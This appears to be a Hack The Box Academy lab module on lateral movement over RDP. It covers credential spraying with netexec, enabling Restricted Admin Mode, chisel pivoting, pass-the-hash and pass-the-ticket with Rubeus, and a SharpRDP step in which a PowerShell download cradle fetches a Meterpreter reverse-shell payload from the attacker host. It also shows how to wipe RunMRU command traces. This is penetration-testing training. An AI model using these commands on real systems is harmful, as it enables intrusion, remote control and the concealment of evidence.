`Remote Desktop Protocol (RDP)` is a proprietary protocol developed by Microsoft that provides a user with a graphical interface to connect to another computer over a network connection. RDP is widely used for remote administration, technical support, and accessing workstations and servers remotely. RDP supports a complete desktop experience, including remote sound, clipboard, printers, and file transfers with high-resolution graphics, which can be scaled down based on bandwidth. RDP by default uses TCP port `3389` for communication.

## RDP Rights

The required rights to connect to RDP depend on the configuration; by default, only members of the `Administrators` or `Remote Desktop Users` groups can connect via RDP. Additionally, an administrator can grant specific users or groups rights to connect to RDP. Because those rights are set locally, the only way to enumerate them is if we have Administrative rights on the target computer.

## RDP Enumeration

To use RDP for lateral movement we need to be aware if RDP is present on the environment we are testing, we can use `NMAP` or any other network enumeration tool to search for port 3389 and once we get a list of targets, we can use that list with tools such as [NetExec](https://github.com/Pennyw0rth/NetExec) to test multiple credentials.

**Note:** RDP uses TCP port `3389` by default, but administrators can configure it in any other port.

To test credentials againts RDP we will use `netexec`. Let's select the protocol `rdp` and the account `Helen` and the password `RedRiot88`:

```shell-session
BusySec@htb[/htb]$ netexec rdp 10.129.229.0/24 -u helen -p 'RedRiot88' -d inlanefreight.local
RDP         10.129.229.242  3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:DC01) (nla:True)
RDP         10.129.229.244  3389   SRV01            [*] Windows 10 or Windows Server 2016 Build 17763 (name:SRV01) (domain:SRV01) (nla:True)
RDP         10.129.229.242  3389   DC01             [-] inlanefreight.local\helen:RedRiot88 (STATUS_LOGON_FAILURE)
RDP         10.129.229.244  3389   SRV01            [+] inlanefreight.local\helen:RedRiot88 (Pwn3d!)
...SNIP...
```

We confirm Helen has RDP rights on SRV01. Remember that `(Pwn3d!)` doesn't mean we have administrative rights on the target machine but that we have rights to connect to RDP

## Lateral Movement From Windows

To connect to RDP from Windows we can use the default windows `Remote Desktop Connection` client that can be accessed by running `mstsc` on Run, Cmd or PowerShell:

```cmd-session
C:\Tools> mstsc.exe
```

This will open a client where we can specify the target IP address or domain name, and once we click `Connect`, it will prompt us for the credentials:

![text](https://academy.hackthebox.com/storage/modules/263/mstsc.png)

Here are some actions that can be efficiently executed using RDP:

- `File Transfer`: Transfer files between the local and remote computers by dragging and dropping files or using copy and paste.
    
- `Running Applications`: Run applications on the remote computer. This is useful for accessing software that is only installed on the remote machine.
    
- `Printing`: Print documents from the remote computer to a printer connected to the local computer.
    
- `Audio and Video Streaming`: Stream audio and video from the remote computer to the local machine, which is useful for multimedia applications.
    
- `Clipboard Sharing`: Share the clipboard between the local and remote computers, allowing you to copy and paste text and images across machines.
    

## Lateral Movement From Linux

To connect to RDP from Linux, we can use the [xfreerdp](https://github.com/FreeRDP/FreeRDP) command-line tool. Here is an example of how to use it:

```shell-session
BusySec@htb[/htb]$ xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux
```

In this command:

- `/u:Helen` specifies the username.
- `/p:'RedRiot88'` specifies the password.
- `/d:inlanefreight.local` specifies the domain.
- `/v:10.129.229.244` specifies the IP address of the target Windows machine.
- `/dynamic-resolution` enables dynamic resolution adjustment which allow us to resize the window dynamically.
- `/drive:.,linux` redirects the local filesystem to the remote session, making it accessible from the remote Windows machine.

By running this command in the terminal, we can establish an RDP connection to the specified Windows machine and perform similar actions as we would using the Windows `Remote Desktop Connection` client.

### Optimizing xfreerdp for Low Latency Networks or Proxy Connections

If you are using `xfreerdp` over a proxy or with slow network connectivity, we can improve the session speed by using the following additional options:

  Remote Desktop Service (RDP)

```shell-session
BusySec@htb[/htb]$ xfreerdp /u:Helen /p:'RedRiot88' /d:inlanefreight.local /v:10.129.229.244 /dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache
```

In this command:

- `/bpp:8`: Reduces the color depth to 8 bits per pixel, decreasing the amount of data transmitted.
- `/compression`: Enables compression to reduce the amount of data sent over the network.
- `-themes`: Disables desktop themes to reduce graphical data.
- `-wallpaper`: Disables the desktop wallpaper to further reduce graphical data.
- `/clipboard`: Enables clipboard sharing between the local and remote machines.
- `/audio-mode:0`: Disables audio redirection to save bandwidth.
- `/auto-reconnect`: Automatically reconnects if the connection drops, improving session stability.
- `-glyph-cache`: Enables caching of glyphs (text characters) to reduce the amount of data sent for text rendering.

Using these options helps to optimize the performance of the RDP session, ensuring a smoother experience even in less-than-ideal network conditions.

## Restricted Admin Mode

Restricted Admin Mode is a security feature introduced by Microsoft to mitigate the risk of credential theft over RDP connections. When enabled, it performs a network logon rather than an interactive logon, preventing the caching of credentials on the remote system. This mode only applies to administrators, so it cannot be used when you log on to a remote computer with a non-admin account.

Although this mode prevents the caching of credentials, if enabled, it allows the execution of `Pass the Hash` or `Pass the Ticket` for lateral movement.

To confirm if `Restricted Admin Mode` is enabled, we can query the following registry key:

  Remote Desktop Service (RDP)

```cmd-session
C:\Tools> reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin
```

The value of `DisableRestrictedAdmin` indicates the status of `Restricted Admin Mode`:

- If the value is `0`, `Restricted Admin Mode` is enabled.
- If the value is `1`, `Restricted Admin Mode` is disabled.

If the key does not exist it means that is disabled and, we will see the following error message:

  Remote Desktop Service (RDP)

```cmd-session
C:\Tools> reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin

ERROR: The system was unable to find the specified registry key or value.
```

Additionally, to enable `Restricted Admin Mode`, we would set the `DisableRestrictedAdmin` value to `0`. Here is the command to enable it:

  Remote Desktop Service (RDP)

```cmd-session
C:\Tools> reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD
```

And to disable `Restricted Admin Mode`, set the `DisableRestrictedAdmin` value to `1`:

  Remote Desktop Service (RDP)

```cmd-session
C:\Tools> reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 1 /t REG_DWORD
```

**Note:** Only members of the Administrators group can abuse `Restricted Admin Mode`.

## Pivoting

It is common that we will need to use pivoting to perform lateral movement, in the module [Pivoting, Tunneling and Port Forwarding](https://academy.hackthebox.com/module/details/158) we explain everything we need to know about pivoting.

In this lab, we have access to one single host. To connect to the other machines from our Linux attack host, we will need to set up a pivot method; in this case, we will use [chisel](https://github.com/jpillora/chisel).

We will need to configure a `socks5` SOCKS proxy on port `1080` in the `/etc/proxychains.conf` file:

  Remote Desktop Service (RDP)

```shell-session
BusySec@htb[/htb]$ cat /etc/proxychains.conf | grep -Ev '(^#|^$)' | grep socks
socks5 127.0.0.1 1080 
```

Next, on our Linux machine, we will initiate reverse port forwarding server:

  Remote Desktop Service (RDP)

```shell-session
BusySec@htb[/htb]$ ./chisel server --reverse 
2024/03/28 07:09:08 server: Reverse tunnelling enabled
2024/03/28 07:09:08 server: Fingerprint AKOstLSoSTPQPp2PVEALM6z9Jx0IQVEEmO7bOSan1s4=
2024/03/28 07:09:08 server: Listening on http://0.0.0.0:8080
2024/03/28 07:10:49 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Then, in `SRV01`, we will connect to the server with the following command `chisel.exe client <VPN IP> R:socks`:

  Remote Desktop Service (RDP)

```powershell-session
PS C:\Tools> .\chisel.exe client 10.10.14.207:8080 R:socks
2024/03/28 06:10:48 client: Connecting to ws://10.10.14.207:8080
2024/03/28 06:10:49 client: Connected (Latency 137.6381ms)
```

**Note:** Those steps are always required when we see the use of `proxychains` during the module. Alternatively, we can also use tools such as [Ligolo-ng](https://github.com/nicocha30/ligolo-ng), which is recommended if using PwnBox.

## Pass the Hash and Pass the Ticket for RDP

Once we confirm `Restricted Admin Mode` is enabled, or if we can enable it, we can proceed to perform `Pass the Hash` or `Pass the Ticket` attacks with RDP.

To perform `Pass the Hash` from a Linux machine, we can use `xfreerdp` with the `/pth` option to use a hash and connect to RDP. Here's an example command:

  Remote Desktop Service (RDP)

```shell-session
BusySec@htb[/htb]$ proxychains4 -q xfreerdp /u:helen /pth:62EBA30320E250ECA185AA1327E78AEB /d:inlanefreight.local /v:172.20.0.52
[13:11:55:443] [84886:84887] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[13:11:55:444] [84886:84887] [WARN][com.freerdp.crypto] - CN = SRV02.inlanefreight.local
```

For `Pass the Ticket` we can use [Rubeus](https://github.com/GhostPack/Rubeus). We will forge a ticket using `Helen`'s hash. First we need to launch a sacrificial process with the option `createnetonly`:

  Remote Desktop Service (RDP)

```powershell-session
PS C:\Tools> .\Rubeus.exe createnetonly /program:powershell.exe /show
```

In the new PowerShell window we will use Helen's hash to forge a Ticket-Granting ticket (TGT):

  Remote Desktop Service (RDP)

```powershell-session
PS C:\Tools> .\Rubeus.exe asktgt /user:helen /rc4:62EBA30320E250ECA185AA1327E78AEB /domain:inlanefreight.local /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 62EBA30320E250ECA185AA1327E78AEB
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.local\helen'
[*] Using domain controller: fe80::711d:1399:b85a:50c5%9:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFrjCCBaqgAwIBBaEDAgEWooIEsTCCBK1hggSpMIIEpaADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
      ...SNIP...

[+] Ticket successfully imported!
...SNIP...
```

From the window where we imported the ticket, we can use the `mstsc /restrictedAdmin` command:

  Remote Desktop Service (RDP)

```powershell-session
PS C:\Tools> mstsc.exe /restrictedAdmin
```

It will open a window as the currently logged-in user. It doesn't matter if the name is not the same as the account we are trying to impersonate.

![text](https://academy.hackthebox.com/storage/modules/263/mstsc-restrictedadmin.png)

When we click login, it will allow us to connect to RDP using the hash:

![text](https://academy.hackthebox.com/storage/modules/263/mstsc-rdp-with-ticket.png)

## SharpRDP

[SharpRDP](https://github.com/0xthirteen/SharpRDP) is a .NET tool that allows for non-graphical, authenticated remote command execution through RDP, leveraging the `mstscax.dll` library used by RDP clients. This tool can perform actions such as connecting, authenticating, executing commands, and disconnecting without needing a GUI client or SOCKS proxy.

SharpRDP relies on the terminal services library (`mstscax.dll`) and generates the required DLLs (`MSTSCLib.DLL` and `AxMSTSCLib.DLL`) from the `mstscax.dll`. It uses an invisible Windows form to handle the terminal services connection object instantiation and perform actions needed for lateral movement.

We will use Metasploit and PowerShell to execute commands on the target machine. In our Linux machine we will execute Metasploit to listen on port 8888:

```shell-session
BusySec@htb[/htb]$ msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_https; set LHOST 10.10.14.207; set LPORT 8888; set EXITONSESSION false; set EXITFUNC thread; run -j"
```

Then we will generate a payload with msfvenom using PowerShell Reflection:

```shell-session
BusySec@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.207 LPORT=8888 -f psh-reflection -o s
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 774 bytes
Final size of psh-reflection file: 3543 bytes
Saved as: s
```

Next we use python http server to host our payload:

```shell-session
BusySec@htb[/htb]$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Now we can use `SharpRDP` to execute a powershell command to execute our payload and provide a session:

```powershell-session
PS C:\Tools> .\SharpRDP.exe computername=srv01 command="powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.207/s')" username=inlanefreight\helen password=RedRiot88
[+] Connected to          :  srv01
[+] Execution priv type   :  non-elevated
[+] Executing powershell.exe iex(new-object net.webclient).downloadstring('http://10.10.14.207/s')
[+] Disconnecting from    :  srv01
[+] Connection closed     :  srv01
```

**Note:** The execution of commands of `SharpRDP` is limited to 259 characters.

`SharpRDP` uses Microsoft Terminal Services to execute commands, leaving traces of command execution within the `RunMRU` registry key (`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` or `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`). We can use [CleanRunMRU](https://github.com/0xthirteen/CleanRunMRU) to clean all command records. To compile the tool, we can use the built-in Microsoft [csc](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/) compiler tool. First, let's transfer CleanRunMRU's `Program.cs` file from our attack host to the target computer:

```powershell-session
PS C:\Tools> wget -Uri http://10.10.14.207/CleanRunMRU/CleanRunMRU/Program.cs -OutFile CleanRunMRU.cs
```

Now we can use `csc.exe` to compile it:

```powershell-session
PS C:\Tools> C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe .\CleanRunMRU.cs
Microsoft (R) Visual C# Compiler version 4.7.3190.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240
```

Now we can use `CleanRunMRU.exe` to clear all commands:

```powershell-session
PS C:\Tools> .\CleanRunMRU.exe  clearall
HKCU:Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
[+] Cleaned all RunMRU values
```

## Advantages of RDP for Lateral Movement

RDP provides several advantages for lateral movement, making it a preferred method for attackers in certain scenarios. Some of the key advantages include:

- `Evade Detection`: RDP traffic is common in business environments, making it less likely to raise suspicion.
- `Non-Admin Access`: RDP access does not necessarily require administrative rights; a non-admin user can also have RDP access.
- `Persistent Access`: Once a foothold is established, RDP can provide persistent access to the network.